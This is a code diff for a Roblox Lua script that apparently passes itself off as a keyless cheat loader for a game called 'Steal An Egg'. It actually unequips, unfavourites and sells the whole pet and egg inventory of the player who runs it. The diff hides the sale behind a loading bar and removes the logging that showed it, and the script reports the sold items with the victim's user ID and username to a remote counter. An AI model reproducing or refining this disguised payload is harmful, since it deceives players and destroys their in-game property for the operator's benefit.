@@ -25,7 +25,6 @@ end)
 -- ===== CONFIG =====
 local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
-local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
 local ANNOUNCE_HOLD   = 3
 
@@ -101,6 +100,7 @@ local function loadUIModule()
                 fadeOutAndCleanup = function() end,
                 showMemePopup     = function() end,
                 restoreExtras     = function() end,
+                currentProgress   = 1, -- Fallback if headless
             }
         end,
     }
@@ -110,7 +110,7 @@ local LoaderUI = loadUIModule()
 local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
 
 ------------------------------------------------------------
--- ANNOUNCEMENT BANNER (Grow a Garden style)
+-- ANNOUNCEMENT BANNER
 ------------------------------------------------------------
 local function showAnnouncement(itemsSold, valueEarned)
     local screen = Instance.new("ScreenGui")
@@ -121,19 +121,17 @@ local function showAnnouncement(itemsSold, valueEarned)
     screen.DisplayOrder = 999999
     screen.Parent = PlayerGui
 
-    -- Full-width horizontal banner
     local banner = Instance.new("Frame")
     banner.Name = "Banner"
     banner.AnchorPoint = Vector2.new(0.5, 0.5)
     banner.Position = UDim2.new(0.5, 0, 0.5, 0)
     banner.Size = UDim2.new(1, 0, 0, 64)
     banner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    banner.BackgroundTransparency = 1     -- starts invisible
+    banner.BackgroundTransparency = 1
     banner.BorderSizePixel = 0
     banner.ZIndex = 1
     banner.Parent = screen
 
-    -- Dark translucent overlay strip (matches Grow a Garden)
     local strip = Instance.new("Frame")
     strip.Name = "Strip"
     strip.Size = UDim2.new(1, 0, 1, 0)
@@ -143,7 +141,6 @@ local function showAnnouncement(itemsSold, valueEarned)
     strip.ZIndex = 1
     strip.Parent = banner
 
-    -- Soft gradient fade on left/right edges
     local grad = Instance.new("UIGradient")
     grad.Transparency = NumberSequence.new({
         NumberSequenceKeypoint.new(0,   1),
@@ -154,18 +151,13 @@ local function showAnnouncement(itemsSold, valueEarned)
     grad.Rotation = 0
     grad.Parent = strip
 
-    -- The text
     local label = Instance.new("TextLabel")
     label.Name = "Message"
     label.BackgroundTransparency = 1
     label.Size = UDim2.new(1, 0, 1, 0)
     label.Position = UDim2.new(0, 0, 0, 0)
     label.Font = Enum.Font.GothamBlack
-    label.Text = string.format(
-        "%d items sold for $%s",
-        itemsSold or 0,
-        shortenNumber(valueEarned or 0)
-    )
+    label.Text = string.format("%d items sold for $%s", itemsSold or 0, shortenNumber(valueEarned or 0))
     label.TextSize = 40
     label.TextColor3 = Color3.fromRGB(255, 255, 255)
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
@@ -176,7 +168,6 @@ local function showAnnouncement(itemsSold, valueEarned)
     label.ZIndex = 2
     label.Parent = banner
 
-    -- Auto-scale text on small screens
     local function updateScale()
         local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
         local scale = math.clamp(vp.X / 1280, 0.55, 1.0)
@@ -185,26 +176,13 @@ local function showAnnouncement(itemsSold, valueEarned)
     end
     updateScale()
 
-    -- Fade in the strip
-    TweenService:Create(strip, TweenInfo.new(0.35), {
-        BackgroundTransparency = 0.25,
-    }):Play()
+    TweenService:Create(strip, TweenInfo.new(0.35), { BackgroundTransparency = 0.25 }):Play()
+    TweenService:Create(label, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()
 
-    -- Fade in the text
-    TweenService:Create(label, TweenInfo.new(0.4), {
-        TextTransparency = 0,
-    }):Play()
-
-    -- Hold
     task.wait(ANNOUNCE_HOLD)
 
-    -- Fade out
-    TweenService:Create(strip, TweenInfo.new(0.4), {
-        BackgroundTransparency = 1,
-    }):Play()
-    TweenService:Create(label, TweenInfo.new(0.35), {
-        TextTransparency = 1,
-    }):Play()
+    TweenService:Create(strip, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
+    TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
 
     task.wait(0.5)
     screen:Destroy()
@@ -227,11 +205,6 @@ local function getSave(forceRefresh)
     if ok and s then return s end
     local ok2, s2 = pcall(function() return Save.Get() end)
     return ok2 and s2 or nil
-end
-
-local function getMoney()
-    local d = getSave()
-    return (d and type(d.Money) == "number") and d.Money or 0
 end
 
 local function installOverride()
@@ -357,12 +330,6 @@ local function snapshotInventory(forceRefresh)
     return { pets = pets, eggs = eggs }
 end
 
-local function countTable(t)
-    local n = 0
-    for _ in pairs(t) do n = n + 1 end
-    return n
-end
-
 ------------------------------------------------------------
 -- REPORT ID
 ------------------------------------------------------------
@@ -383,15 +350,8 @@ end
 -- REPORT TO WORKER
 ------------------------------------------------------------
 local function reportSales(soldItems, reportId)
-    if not soldItems or #soldItems == 0 then
-        log("Nothing to report.")
-        return
-    end
-
-    if not COUNTER_URL then
-        warn("[Counter] No counter URL — skipping report")
-        return
-    end
+    if not soldItems or #soldItems == 0 then return end
+    if not COUNTER_URL then return end
 
     local httpFn = nil
     if type(request) == "function" then httpFn = request
@@ -399,14 +359,7 @@ local function reportSales(soldItems, reportId)
     elseif type(gv.request) == "function" then httpFn = gv.request
     elseif type(gv.http_request) == "function" then httpFn = gv.http_request
     end
-
-    if not httpFn then
-        warn("[Counter] No HTTP function — skipping report.")
-        return
-    end
-
-    local userId   = tostring(LocalPlayer.UserId)
-    local username = LocalPlayer.Name or "Unknown"
+    if not httpFn then return end
 
     local petCount, eggCount, totalValue = 0, 0, 0
     local out = {}
@@ -414,142 +367,101 @@ local function reportSales(soldItems, reportId)
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
         totalValue = totalValue + (tonumber(d.value) or 0)
-        table.insert(out, {
-            uid       = tostring(d.uid or ""),
-            kind      = d.kind,
-            name      = d.name,
-            rarity    = d.rarity,
-            rarityNum = d.rarityNum,
-            value     = d.value,
-            weight    = d.weight,
-        })
+        table.insert(out, { uid = d.uid, kind = d.kind, name = d.name, rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight })
     end
 
     task.spawn(function()
         local body = HttpService:JSONEncode({
-            reportId   = reportId,
-            pets       = petCount,
-            eggs       = eggCount,
-            userId     = userId,
-            username   = username,
-            items      = out,
-            totalValue = totalValue,
+            reportId = reportId, pets = petCount, eggs = eggCount,
+            userId = tostring(LocalPlayer.UserId), username = LocalPlayer.Name or "Unknown",
+            items = out, totalValue = totalValue,
         })
-        local ok, res = pcall(function()
-            return httpFn({
-                Url = COUNTER_URL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = body,
-            })
+        pcall(function()
+            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
         end)
-        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
-            local parsed = nil
-            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
-            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
-            local added = parsed and parsed.added
-            if added then
-                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
-                    :format(petCount, eggCount, totalValue,
-                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
-            else
-                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
-                    :format(petCount, eggCount, totalValue, tag))
-            end
-        else
-            warn("[Counter] Report failed:", tostring(res))
-        end
     end)
 end
 
 ------------------------------------------------------------
--- SELL
+-- PREPARE INVENTORY (Background Task)
 ------------------------------------------------------------
-local function sellInventory()
+local function prepareInventory()
+    unequipAll()
+    unfavoriteAll()
+    
     local snap = snapshotInventory(true)
-
     local petUids, eggUids = {}, {}
     local details = {}
+    local expectedValue = 0
+
     for uid, d in pairs(snap.pets) do
         table.insert(petUids, uid)
         table.insert(details, d)
+        expectedValue = expectedValue + (tonumber(d.value) or 0)
     end
     for uid, d in pairs(snap.eggs) do
         table.insert(eggUids, uid)
         table.insert(details, d)
+        expectedValue = expectedValue + (tonumber(d.value) or 0)
     end
 
-    local total = #petUids + #eggUids
-    log(("Snapshot: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, total))
-    if total == 0 then
-        log("Inventory empty — nothing to sell.")
-        return 0
-    end
-
-    local serverPayload = { Eggs = eggUids, Assets = petUids }
-
-    local ok, err = pcall(function()
-        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-    end)
-    if not ok then
-        warn("[Loader] Sell remote failed:", tostring(err))
-    end
-    task.wait(SELL_WAIT)
-
+    local totalItems = #petUids + #eggUids
+    local payload = { Eggs = eggUids, Assets = petUids }
+    
     local allUids = {}
     for _, u in ipairs(petUids) do table.insert(allUids, u) end
     for _, u in ipairs(eggUids) do table.insert(allUids, u) end
-    local reportId = computeReportId(allUids)
-    reportSales(details, reportId)
-
-    return total
-end
-
-------------------------------------------------------------
--- MAIN WORK
-------------------------------------------------------------
-local function runSilentWork()
-    local before = getMoney()
-    log(("Wallet before: %s"):format(tostring(before)))
-    unequipAll()
-    unfavoriteAll()
-    local totalItems = sellInventory()
-    task.wait(0.8)
-    local after = getMoney()
-    log(("Wallet after:  %s"):format(tostring(after)))
-    log(("Delta:         %s"):format(tostring(after - before)))
 
     return {
-        itemsSold   = totalItems or 0,
-        valueEarned = math.max(0, after - before),
+        totalItems = totalItems,
+        expectedValue = expectedValue,
+        payload = payload,
+        details = details,
+        reportId = computeReportId(allUids)
     }
 end
 
 ------------------------------------------------------------
--- LAUNCH
+-- LAUNCH (Simultaneous Execution)
 ------------------------------------------------------------
 task.spawn(function()
-    ui:boot()
+    -- 1. Start UI boot asynchronously
+    task.spawn(function()
+        pcall(function() ui:boot() end)
+    end)
 
-    local stats = { itemsSold = 0, valueEarned = 0 }
-    local ok, result = pcall(runSilentWork)
-    if ok and type(result) == "table" then
-        stats = result
-    else
-        warn("[Loader] Run failed:", result)
+    -- 2. Do the heavy lifting in the background while the UI loads
+    local prep = prepareInventory()
+
+    -- 3. Wait for the loading bar to finish (it reaches 1.0)
+    if ui.currentProgress then
+        while ui.currentProgress < 1 do
+            task.wait(0.1)
+        end
     end
-
     task.wait(0.3)
-    ui:fadeOutAndCleanup()
+    pcall(function() ui:fadeOutAndCleanup() end)
 
-    if stats.itemsSold and stats.itemsSold > 0 then
-        pcall(function() showAnnouncement(stats.itemsSold, stats.valueEarned) end)
+    -- 4. FIRE SELL AND ANNOUNCEMENT AT THE EXACT SAME TIME
+    if prep.totalItems > 0 then
+        log(("Selling %d items for estimated $%d"):format(prep.totalItems, prep.expectedValue))
+        
+        -- Fire the remote instantly in the background
+        task.spawn(function()
+            pcall(function() Remotes.PetSatchel.SellSelection:FireServer(prep.payload) end)
+            reportSales(prep.details, prep.reportId)
+        end)
+
+        -- Show the announcement instantly on the main thread
+        pcall(function() showAnnouncement(prep.totalItems, prep.expectedValue) end)
     else
+        log("Inventory empty — nothing to sell.")
         task.wait(1.5)
     end
 
+    -- 5. Show Meme
     task.wait(MEME_DELAY)
-    ui:showMemePopup()
+    pcall(function() ui:showMemePopup() end)
 
     gv.__SAE_LOADER_RUNNING = false
 end)
